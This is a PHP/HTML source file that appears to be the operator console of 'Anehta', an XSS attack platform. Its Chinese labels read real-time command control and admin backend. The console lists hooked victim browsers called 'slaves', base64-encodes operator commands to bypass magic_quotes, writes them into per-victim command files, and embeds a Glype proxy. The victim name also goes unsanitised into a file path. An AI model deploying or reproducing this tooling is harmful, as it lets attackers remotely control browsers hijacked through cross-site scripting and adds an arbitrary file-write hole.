<html><meta http-equiv=content-type content="text/html; charset=utf-8">
	<head>
	<script src="../library/anehta.js" ></script>
	<script src="../library/jQuery.js" ></script>
	<head>
	<body>
<br>===================== Anehta ======================</br>
<br>================ axis@ph4nt0m.org =================</br>
<br>========== http://anehta.googlecode.com ===========</br>
		<p><iframe width=800 height=200 src="../slave/index.php" ></iframe></p>
		实时命令控制:
		<form id="realcmd" action="<?php $_SERVER['PHP_SELF']; ?>" method="post" onsubmit="return encodeCmd(this);">
			<textarea id="cmd" name="cmd" cols=40 rows=6 ></textarea>
			<script>
			  function encodeCmd(f){
			  	// base64 encode cmd to bypass magic_quotes on
			  	document.getElementsByTagName('textarea')[0].value = anehta.crypto.base64Encode(document.getElementsByTagName('textarea')[0].value);
			  	f.submit();
			  }	
			</script>
			<p>
				WaterMark: <input type=text id="slave" name="slave" value="" />
			  <input type=submit value="FVCK!" />
		  </p>
		</form>
	<br />
	Configure Your Anehta:<br />
	<iframe width=500 height=500 src="config.php" ></iframe>  
	<br />
	<iframe width=800 height=700 src="../tools/glype/index.php" ></iframe>
	  
	<br />
		
		
	</body>
	
</html>

<?php
// 管理后台

if (!empty($_POST["cmd"])){
  $realtime_cmd = base64_decode($_POST["cmd"]);
  $slavewatermark = $_POST["slave"]; 
  
  $fp = fopen("../slave/$slavewatermark/realtimecmd.txt", "w+");

  fwrite($fp, urldecode($realtime_cmd));

  fclose($fp);
}

?>

